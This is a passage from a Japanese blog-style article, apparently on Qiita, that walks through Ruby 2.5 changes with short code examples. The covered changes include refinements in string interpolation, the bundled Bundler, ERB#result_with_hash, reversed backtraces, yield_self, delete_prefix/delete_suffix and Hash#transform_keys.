<span id="refinementsでto_sを書き換えたときに文字列の式展開でもrefinements側のto_sが使われるようになった" class="fragment"></span><a href="#refinements%E3%81%A7to_s%E3%82%92%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AB%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E5%BC%8F%E5%B1%95%E9%96%8B%E3%81%A7%E3%82%82refinements%E5%81%B4%E3%81%AEto_s%E3%81%8C%E4%BD%BF%E3%82%8F%E3%82%8C%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>refinementsでto_sを書き換えたときに、文字列の式展開でもrefinements側のto_sが使われるようになった</h3>

<p>次のようなrefinementsを使ったクラス定義があったとします。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">A</span>
<span class="k">end</span>

<span class="k">module</span> <span class="nn">B</span>
  <span class="n">refine</span> <span class="n">A</span> <span class="k">do</span>
    <span class="k">def</span> <span class="nf">to_s</span>
      <span class="s1">'b'</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="k">class</span> <span class="nc">C</span>
  <span class="n">using</span> <span class="n">B</span>

  <span class="k">def</span> <span class="nf">initialize</span>
    <span class="vi">@a</span> <span class="o">=</span> <span class="n">A</span><span class="o">.</span><span class="n">new</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">c1</span>
    <span class="vi">@a</span><span class="o">.</span><span class="n">to_s</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">c2</span>
    <span class="s2">"</span><span class="si">#{</span><span class="vi">@a</span><span class="si">}</span><span class="s2">"</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div></div>

<p>さらにクラスCのc1メソッドとc2メソッドを次のように呼び出します。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">C</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">c1</span>
<span class="n">C</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">c2</span>
</pre></div></div>

<p>明示的に<code>to_s</code>メソッドを呼びだしているc1メソッドはもちろん、式展開で暗黙的に<code>to_s</code>が使われるc2メソッドもどちらも同じ結果になる（module Bのrefinementsが有効になっている）と思いますが、Ruby 2.4ではこのようになっていました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.4</span>
<span class="n">C</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">c1</span> <span class="c1">#=&gt; "b"</span>
<span class="n">C</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">c2</span> <span class="c1">#=&gt; "#&lt;A:0x00007f870a852d50&gt;"</span>
</pre></div></div>

<p>ごらんのとおり、c2メソッド（式展開を使った場合）はrefinementsが有効になっていません。<br>
ですが、Ruby 2.5ではどちらもrefinementsが有効になりました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.5</span>
<span class="n">C</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">c1</span> <span class="c1">#=&gt; "b"</span>
<span class="n">C</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">c2</span> <span class="c1">#=&gt; "b"</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13812" rel="nofollow noopener" target="_blank">Feature #13812: Refinements で定義した to_s を String interpolation が呼んでくれない</a>
</li>
</ul>

<h2>
<span id="標準ライブラリ関連の変更点" class="fragment"></span><a href="#%E6%A8%99%E6%BA%96%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E9%96%A2%E9%80%A3%E3%81%AE%E5%A4%89%E6%9B%B4%E7%82%B9"><i class="fa fa-link"></i></a>標準ライブラリ関連の変更点</h2>

<h3>
<span id="bundlerが標準ライブラリに取り込まれた" class="fragment"></span><a href="#bundler%E3%81%8C%E6%A8%99%E6%BA%96%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%81%AB%E5%8F%96%E3%82%8A%E8%BE%BC%E3%81%BE%E3%82%8C%E3%81%9F"><i class="fa fa-link"></i></a>Bundlerが標準ライブラリに取り込まれた</h3>

<p>Bundlerが標準ライブラリに取り込まれました。<br>
なので、<code>gem install bundler</code>なしでBundlerが使えるようになります。</p>

<p>この記事の執筆時点ではBundler 1.15.4がインストールされるようです。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ ruby -v
ruby 2.5.0preview1 (2017-10-10 trunk 60153) [x86_64-darwin16]
$ bundler -v
Bundler version 1.15.4
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/12733" rel="nofollow noopener" target="_blank">Feature #12733: Bundle bundler to ruby core</a>
</li>
</ul>

<h3>
<span id="erbのローカル変数をhashで渡せる-erbresult_with_hash-メソッド" class="fragment"></span><a href="#erb%E3%81%AE%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E5%A4%89%E6%95%B0%E3%82%92hash%E3%81%A7%E6%B8%A1%E3%81%9B%E3%82%8B-erbresult_with_hash-%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89"><i class="fa fa-link"></i></a>ERBのローカル変数をHashで渡せる ERB#result_with_hash メソッド</h3>

<p>これまでERBでテンプレート内で使われるローカル変数を渡すには、以下のようにbindingを渡したり、あるいは渡す変数を絞るために<a href="https://github.com/search?q=erb+result+openstruct&amp;type=Code&amp;ref=searchresults" rel="nofollow noopener" target="_blank">structを定義する</a>必要がありました。</p>

<div class="code-frame" data-lang="rb"><div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'erb'</span>
<span class="nb">require</span> <span class="s1">'ostruct'</span>

<span class="n">namespace</span> <span class="o">=</span> <span class="no">OpenStruct</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="ss">a</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="ss">b</span><span class="p">:</span> <span class="mi">3</span><span class="p">)</span>
<span class="n">template</span> <span class="o">=</span> <span class="s1">'Result: &lt;%= a * b %&gt;'</span>
<span class="no">ERB</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">template</span><span class="p">)</span><span class="o">.</span><span class="n">result</span><span class="p">(</span><span class="n">namespace</span><span class="o">.</span><span class="n">instance_eval</span> <span class="p">{</span> <span class="nb">binding</span> <span class="p">})</span> <span class="c1">#=&gt; "Result: 6"</span>
</pre></div></div>

<p>これが、<code>ERB#result_with_hash</code>の導入により、最低限の変数だけ渡すのが以下のように簡単に書けるようになりました。</p>

<div class="code-frame" data-lang="rb"><div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'erb'</span>

<span class="no">ERB</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">'Result: &lt;%= a * b %&gt;'</span><span class="p">)</span><span class="o">.</span><span class="n">result_with_hash</span><span class="p">(</span><span class="ss">a</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="ss">b</span><span class="p">:</span> <span class="mi">3</span><span class="p">)</span> <span class="c1">#=&gt; "Result: 6"</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/8631" rel="nofollow noopener" target="_blank">Feature #8631: Add a new method to ERB to allow assigning the local variables from a hash</a>
</li>
</ul>

<h2>
<span id="実験中の変更点" class="fragment"></span><a href="#%E5%AE%9F%E9%A8%93%E4%B8%AD%E3%81%AE%E5%A4%89%E6%9B%B4%E7%82%B9"><i class="fa fa-link"></i></a>実験中の変更点</h2>

<h3>
<span id="バックトレースの表示順が逆になる" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%81%AE%E8%A1%A8%E7%A4%BA%E9%A0%86%E3%81%8C%E9%80%86%E3%81%AB%E3%81%AA%E3%82%8B"><i class="fa fa-link"></i></a>バックトレースの表示順が逆になる？</h3>

<p>これはあくまで「実験段階」の変更点ですが、エラー発生時のバックトレースの出力順が逆になっています。</p>

<p>たとえば次のような例外が発生するスクリプトがあったとします。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">method_1</span>
  <span class="n">method_2</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">method_2</span>
  <span class="c1"># ZeroDivisionErrorを発生させる</span>
  <span class="mi">1</span> <span class="o">/</span> <span class="mi">0</span>
<span class="k">end</span>

<span class="n">method_1</span>
</pre></div></div>

<p>Ruby 2.4までは次のようにバックトレースが出力されていました。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ ruby ./test/error_example.rb 
./test/error_example.rb:7:in `/': divided by 0 (ZeroDivisionError)
    from ./test/error_example.rb:7:in `method_2'
    from ./test/error_example.rb:2:in `method_1'
    from ./test/error_example.rb:10:in `&lt;main&gt;'
</pre></div></div>

<p>Ruby 2.5ではこれが逆順で表示されます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ ruby ./test/error_example.rb 
Traceback (most recent call last):
        3: from ./test/error_example.rb:10:in `&lt;main&gt;'
        2: from ./test/error_example.rb:2:in `method_1'
        1: from ./test/error_example.rb:7:in `method_2'
./test/error_example.rb:7:in `/': divided by 0 (ZeroDivisionError)
</pre></div></div>

<p><a href="https://bugs.ruby-lang.org/issues/8661" rel="nofollow noopener" target="_blank">元のIssue</a>を読むと、「バックトレースが長大になるとき、ターミナル上で上スクロールせずにエラーメッセージが確認できる」「上から下に実行過程が読める」というメリットがある、とのことです。</p>

<p>ただし、今のところ逆順に表示されるのは「組み込み定数である<code>STDERR</code>が変更されておらず、なおかつ、<a href="https://ja.wikipedia.org/wiki/Tty" rel="nofollow noopener" target="_blank">tty</a>（標準入出力となっている端末デバイス）に出力する場合のみ」となっているようです。</p>

<p>そのため、上記の条件に合致しない場合（irbなど）は今までの出力順になっています。</p>

<p>また、例外オブジェクトの<code>backtrace</code>で返される配列もこれまでどおりの順番です。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">method_1</span>
  <span class="k">begin</span>
    <span class="n">method_2</span>
  <span class="k">rescue</span> <span class="o">=&gt;</span> <span class="n">e</span>
    <span class="c1"># Ruby 2.4も2.5も中身の順序は同じ</span>
    <span class="nb">puts</span> <span class="n">e</span><span class="o">.</span><span class="n">backtrace</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div></div>

<p>ただし、繰り返しになりますが、これはまだ「実験中」の仕様変更です。<br>
フィードバックを集めてからこの変更を適用するかどうかを決定するとのことです（<a href="https://bugs.ruby-lang.org/issues/8661#note-9" rel="nofollow noopener" target="_blank">参考</a>）。</p>

<p>僕個人の意見としては「今さら導入するにはユーザーへのインパクトが大きそうな割に、そこまで嬉しいメリットもないのでどちらかといえば反対」ですね。</p>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/8661" rel="nofollow noopener" target="_blank">Feature #8661: Add option to print backstrace in reverse order(stack frames first &amp; error last) - CommonRuby - Ruby Issue Tracking System</a>
</li>
</ul>

<h2>
<span id="オブジェクト全般の新機能" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E5%85%A8%E8%88%AC%E3%81%AE%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>オブジェクト全般の新機能</h2>

<h3>
<span id="ブロックの実行結果がそのまま戻り値になるyield_self" class="fragment"></span><a href="#%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%81%AE%E5%AE%9F%E8%A1%8C%E7%B5%90%E6%9E%9C%E3%81%8C%E3%81%9D%E3%81%AE%E3%81%BE%E3%81%BE%E6%88%BB%E3%82%8A%E5%80%A4%E3%81%AB%E3%81%AA%E3%82%8Byield_self"><i class="fa fa-link"></i></a>ブロックの実行結果がそのまま戻り値になるyield_self</h3>

<p>Ruby 2.5ではレシーバがブロックの引数になり、ブロックの結果がそのまま戻り値になる<code>yield_self</code>が追加されました。<br>
Kernelモジュールのメソッドなので、すべてのオブジェクト（BasicObjectを除く）で使用できます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># レシーバ（= 2）を受け取り、ブロックの戻り値（= 2 * 10）がメソッド全体の戻り値になる</span>
<span class="mi">2</span><span class="o">.</span><span class="n">yield_self</span> <span class="p">{</span> <span class="o">|</span><span class="n">n</span><span class="o">|</span> <span class="n">n</span> <span class="o">*</span> <span class="mi">10</span> <span class="p">}</span> <span class="c1">#=&gt; 20</span>
</pre></div></div>

<p>以下は配列に含まれる文字列をカンマで連結し、さらにそれを丸括弧で囲むコード例です。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">names</span> <span class="o">=</span> <span class="o">[</span><span class="s1">'Alice'</span><span class="p">,</span> <span class="s1">'Bob'</span><span class="o">]</span>
<span class="n">names</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">', '</span><span class="p">)</span><span class="o">.</span><span class="n">yield_self</span> <span class="p">{</span> <span class="o">|</span><span class="n">s</span><span class="o">|</span> <span class="s2">"(</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">)"</span> <span class="p">}</span> <span class="c1">#=&gt; "(Alice, Bob)"</span>
</pre></div></div>

<p>ちなみに、<code>yield_self</code>についてはこちらの記事でも紹介されています。</p>

<p><a href="https://qiita.com/opt-link/items/8195f3a03859bcb10920" id="reference-6c1609c8344df65a0b9b">Ruby2.5で導入されるyield_selfについて - Qiita</a></p>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/6721" rel="nofollow noopener" target="_blank">Feature #6721: Object#yield_self</a>
</li>
</ul>

<h2>
<span id="文字列正規表現に関する新機能" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>文字列/正規表現に関する新機能</h2>

<h3>
<span id="接頭辞や接尾辞を削除するdelete_prefixdelete_suffix" class="fragment"></span><a href="#%E6%8E%A5%E9%A0%AD%E8%BE%9E%E3%82%84%E6%8E%A5%E5%B0%BE%E8%BE%9E%E3%82%92%E5%89%8A%E9%99%A4%E3%81%99%E3%82%8Bdelete_prefixdelete_suffix"><i class="fa fa-link"></i></a>接頭辞や接尾辞を削除するdelete_prefix/delete_suffix</h3>

<p>Ruby 2.5では文字列から接頭辞や接尾辞を削除する<code>delete_prefix</code>と<code>delete_suffix</code>が追加されました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="s1">'invisible'</span><span class="o">.</span><span class="n">delete_prefix</span><span class="p">(</span><span class="s1">'in'</span><span class="p">)</span> <span class="c1">#=&gt; "visible"</span>
<span class="s1">'pink'</span><span class="o">.</span><span class="n">delete_prefix</span><span class="p">(</span><span class="s1">'in'</span><span class="p">)</span> <span class="c1">#=&gt; "pink"</span>

<span class="s1">'worked'</span><span class="o">.</span><span class="n">delete_suffix</span><span class="p">(</span><span class="s1">'ed'</span><span class="p">)</span> <span class="c1">#=&gt; "work"</span>
<span class="s1">'medical'</span><span class="o">.</span><span class="n">delete_suffix</span><span class="p">(</span><span class="s1">'ed'</span><span class="p">)</span> <span class="c1">#=&gt; "medical"</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/12694" rel="nofollow noopener" target="_blank">Feature #12694: Want a String method to remove heading substr</a>
</li>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13665" rel="nofollow noopener" target="_blank">Feature #13665: String#delete_suffix</a>
</li>
</ul>

<h3>
<span id="casecmpcasecmpに文字列以外の引数を渡したときに例外ではなくnilを返すようになった" class="fragment"></span><a href="#casecmpcasecmp%E3%81%AB%E6%96%87%E5%AD%97%E5%88%97%E4%BB%A5%E5%A4%96%E3%81%AE%E5%BC%95%E6%95%B0%E3%82%92%E6%B8%A1%E3%81%97%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AB%E4%BE%8B%E5%A4%96%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%8Fnil%E3%82%92%E8%BF%94%E3%81%99%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>casecmp/casecmp?に文字列以外の引数を渡したときに例外ではなくnilを返すようになった</h3>

<p>Ruby 2.5では<code>casecmp/casecmp?</code>メソッドに文字列以外の引数（数値など）を渡したときに<code>nil</code>を返すようになりました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.4</span>
<span class="s1">'abc'</span><span class="o">.</span><span class="n">casecmp</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1">#=&gt; TypeError</span>
<span class="s1">'abc'</span><span class="o">.</span><span class="n">casecmp?</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#=&gt; TypeError</span>

<span class="c1"># Ruby 2.5</span>
<span class="s1">'abc'</span><span class="o">.</span><span class="n">casecmp</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1">#=&gt; nil</span>
<span class="s1">'abc'</span><span class="o">.</span><span class="n">casecmp?</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#=&gt; nil</span>
</pre></div></div>

<p>シンボルでは以前から<code>nil</code>を返していたいので、それに挙動を合わせたようです。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># Ruby 2.4, 2.5</span>
<span class="ss">:abc</span><span class="o">.</span><span class="n">casecmp</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1">#=&gt; nil</span>
<span class="ss">:abc</span><span class="o">.</span><span class="n">casecmp?</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#=&gt; nil</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13312" rel="nofollow noopener" target="_blank">Bug #13312: String#casecmp raises TypeError instead of returning nil</a>
</li>
</ul>

<h3>
<span id="正規表現で非包含オペレータが使えるようになったruby-241以降" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%A7%E9%9D%9E%E5%8C%85%E5%90%AB%E3%82%AA%E3%83%9A%E3%83%AC%E3%83%BC%E3%82%BF%E3%81%8C%E4%BD%BF%E3%81%88%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9Fruby-241%E4%BB%A5%E9%99%8D"><i class="fa fa-link"></i></a>正規表現で非包含オペレータが使えるようになった（Ruby 2.4.1以降）</h3>

<p>これはRuby 2.5ではなく、Ruby 2.4.1からの新機能ですが、正規表現エンジンが鬼雲6.1.1にアップデートされ、非包含オペレータ（<code>(?~)</code>）が使えるようになりました。</p>

<p>以下は非包含オペレータを使って、DEBUGとINFOを含まない行を抜き出すコード例です。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">text</span> <span class="o">=</span> <span class="o">&lt;&lt;</span><span class="dl">LOG</span>
<span class="sh">10:00 [INFO] Lorem ipsum dolor sit amet</span>
<span class="sh">10:10 [WARN] Lorem ipsum dolor sit amet</span>
<span class="sh">10:20 [INFO] Lorem ipsum dolor sit amet</span>
<span class="sh">10:25 [DEBUG] Lorem ipsum dolor sit amet</span>
<span class="sh">10:30 [ERROR] Lorem ipsum dolor sit amet</span>
<span class="sh">10:40 [INFO] Lorem ipsum dolor sit amet</span>
<span class="dl">LOG</span>

<span class="nb">puts</span> <span class="n">text</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="sr">/^(?~DEBUG|INFO)$/</span><span class="p">)</span>
<span class="c1">#=&gt; 10:10 [WARN] Lorem ipsum dolor sit amet</span>
<span class="c1">#   10:30 [ERROR] Lorem ipsum dolor sit amet</span>
</pre></div></div>

<p>非包含オペレータの詳細については以下の記事を参照してください。</p>

<ul>
<li><a href="https://qiita.com/k-takata/items/4e45121081c83d3d5bfd" id="reference-fbed33eb53db80e61d08">鬼雲に非包含オペレータを実装した話 - Qiita</a></li>
<li><a href="https://techracho.bpsinc.jp/hachi8833/2017_03_23/37689" rel="nofollow noopener" target="_blank">Ruby 2.4.1新機能: Onigmo正規表現の非包含演算子(?~ )をチェック</a></li>
</ul>

<h3>
<span id="unicode-10をサポートするようになった" class="fragment"></span><a href="#unicode-10%E3%82%92%E3%82%B5%E3%83%9D%E3%83%BC%E3%83%88%E3%81%99%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>Unicode 10をサポートするようになった</h3>

<p>Ruby 2.5ではUnicode 10をサポートするようになりました。</p>

<p>これにより、たとえば正規表現で<a href="http://yanok.net/2017/06/unicode-100.html" rel="nofollow noopener" target="_blank">変体仮名</a>を表す<code>In_Kana_Extended_A</code>プロパティ（Unicode 10で追加されたプロパティ）を使えたりするようになります。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="s2">"A\u{1B10A}B"</span><span class="o">.</span><span class="n">match?</span><span class="p">(</span><span class="sr">/\p{In_Kana_Extended_A}/</span><span class="p">)</span> <span class="c1">#=&gt; true</span>
</pre></div></div>

<p>ちなみに<code>\u{1B10A}</code>というのはこんな文字です。（大半のブラウザでは表示できないはずです）</p>

<p><a href="https://camo.qiitausercontent.com/a1f5825216a0f69aee45e6d401845abbbb48da08/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373436352f64303631636561362d313863622d633335332d366161362d6562393231643066336534332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a1f5825216a0f69aee45e6d401845abbbb48da08/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373436352f64303631636561362d313863622d633335332d366161362d6562393231643066336534332e706e67" alt="Screen Shot 2017-10-10 at 7.40.58.png" title="Screen Shot 2017-10-10 at 7.40.58.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7465/d061cea6-18cb-c353-6aa6-eb921d0f3e43.png"></a><br>
<a href="http://www.unicode.org/charts/PDF/Unicode-10.0/U100-1B100.pdf" class="autolink" rel="nofollow noopener" target="_blank">http://www.unicode.org/charts/PDF/Unicode-10.0/U100-1B100.pdf</a></p>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13685" rel="nofollow noopener" target="_blank">Feature #13685: Update Unicode data to Unicode Version 10.0.0</a>
</li>
</ul>

<h2>
<span id="配列に関する新機能" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>配列に関する新機能</h2>

<h3>
<span id="unshiftpushのエイリアスメソッドとしてprependappendが追加された" class="fragment"></span><a href="#unshiftpush%E3%81%AE%E3%82%A8%E3%82%A4%E3%83%AA%E3%82%A2%E3%82%B9%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%A8%E3%81%97%E3%81%A6prependappend%E3%81%8C%E8%BF%BD%E5%8A%A0%E3%81%95%E3%82%8C%E3%81%9F"><i class="fa fa-link"></i></a>unshift/pushのエイリアスメソッドとしてprepend/appendが追加された</h3>

<p>Ruby 2.5では<code>unshift</code>/<code>push</code>のエイリアスメソッドとして<code>prepend</code>/<code>append</code>が追加されました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">array</span> <span class="o">=</span> <span class="o">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="o">]</span>
<span class="n">array</span><span class="o">.</span><span class="n">prepend</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1">#=&gt; [1, 2, 3, 4]</span>
<span class="n">array</span>               <span class="c1">#=&gt; [1, 2, 3, 4]</span>

<span class="n">array</span> <span class="o">=</span> <span class="o">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="o">]</span>
<span class="n">array</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>  <span class="c1">#=&gt; [1, 2, 3, 4]</span>
<span class="n">array</span>               <span class="c1">#=&gt; [1, 2, 3, 4]</span>
</pre></div></div>

<p>個人的には<code>unshift</code>/<code>push</code>よりも直感的に理解しやすいメソッド名だなと思います <img alt=":smiley:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f603.png" title=":smiley:" width="20"> </p>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/12746" rel="nofollow noopener" target="_blank">Feature #12746: class Array: alias .prepend to .unshift ?</a>
</li>
</ul>

<h2>
<span id="ハッシュに関する新機能" class="fragment"></span><a href="#%E3%83%8F%E3%83%83%E3%82%B7%E3%83%A5%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>ハッシュに関する新機能</h2>

<h3>
<span id="キーを特定のルールで変換するtransform_keystransform_keys" class="fragment"></span><a href="#%E3%82%AD%E3%83%BC%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%AE%E3%83%AB%E3%83%BC%E3%83%AB%E3%81%A7%E5%A4%89%E6%8F%9B%E3%81%99%E3%82%8Btransform_keystransform_keys"><i class="fa fa-link"></i></a>キーを特定のルールで変換するtransform_keys/transform_keys!</h3>

<p>Ruby 2.5ではハッシュのキーを特定のルールで変換する<code>transform_keys</code>が追加されました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">hash</span> <span class="o">=</span> <span class="p">{</span> <span class="ss">a</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">b</span><span class="p">:</span> <span class="mi">2</span> <span class="p">}</span>
<span class="nb">hash</span><span class="o">.</span><span class="n">transform_keys</span> <span class="p">{</span> <span class="o">|</span><span class="n">k</span><span class="o">|</span> <span class="n">k</span><span class="o">.</span><span class="n">to_s</span> <span class="p">}</span>
<span class="c1">#=&gt; { 'a' =&gt; 1, 'b' =&gt; 2 }</span>
</pre></div></div>

<p><code>transform_keys!</code>はレシーバのハッシュ自身を変更させます（破壊的メソッド）。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">hash</span> <span class="o">=</span> <span class="p">{</span> <span class="ss">a</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">b</span><span class="p">:</span> <span class="mi">2</span> <span class="p">}</span>
<span class="nb">hash</span><span class="o">.</span><span class="n">transform_keys!</span> <span class="p">{</span> <span class="o">|</span><span class="n">k</span><span class="o">|</span> <span class="n">k</span><span class="o">.</span><span class="n">to_s</span> <span class="p">}</span>
<span class="c1">#=&gt; { 'a' =&gt; 1, 'b' =&gt; 2 }</span>

<span class="nb">hash</span>
<span class="c1">#=&gt; { 'a' =&gt; 1, 'b' =&gt; 2 }</span>
</pre></div></div>

<p>ちなみにRuby 2.4ではハッシュの値を変換する<code>transform_values</code>メソッドが追加されていました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">hash</span> <span class="o">=</span> <span class="p">{</span><span class="ss">a</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">b</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="ss">c</span><span class="p">:</span> <span class="mi">3</span><span class="p">}</span>
<span class="nb">hash</span><span class="o">.</span><span class="n">transform_values</span> <span class="p">{</span><span class="o">|</span><span class="n">v</span><span class="o">|</span> <span class="n">v</span> <span class="o">**</span> <span class="mi">2</span> <span class="p">}</span> <span class="c1">#=&gt; {a: 1, b: 4, c: 9}</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13583" rel="nofollow noopener" target="_blank">Feature #13583: Adding `Hash#transform_keys` method</a>
</li>
</ul>

<h3>
<span id="keyerrorにreceiverメソッドとkeyメソッドが追加された" class="fragment"></span><a href="#keyerror%E3%81%ABreceiver%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%A8key%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%8C%E8%BF%BD%E5%8A%A0%E3%81%95%E3%82%8C%E3%81%9F"><i class="fa fa-link"></i></a>KeyErrorにreceiverメソッドとkeyメソッドが追加された</h3>

<p>Ruby 2.5では<code>fetch</code>メソッドなどでキーが見つからなかったときに発生するKeyErrorに<code>receiver</code>メソッドと<code>key</code>メソッドが追加されました。</p>

<p><code>receiver</code>はエラーが起きたハッシュ自身を、<code>key</code>は見つからなかったキーを返します。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="k">begin</span>
  <span class="n">h</span> <span class="o">=</span> <span class="p">{</span><span class="ss">foo</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">bar</span><span class="p">:</span> <span class="mi">2</span><span class="p">}</span>
  <span class="n">h</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="ss">:bax</span><span class="p">)</span>
<span class="k">rescue</span> <span class="no">KeyError</span> <span class="o">=&gt;</span> <span class="n">e</span>
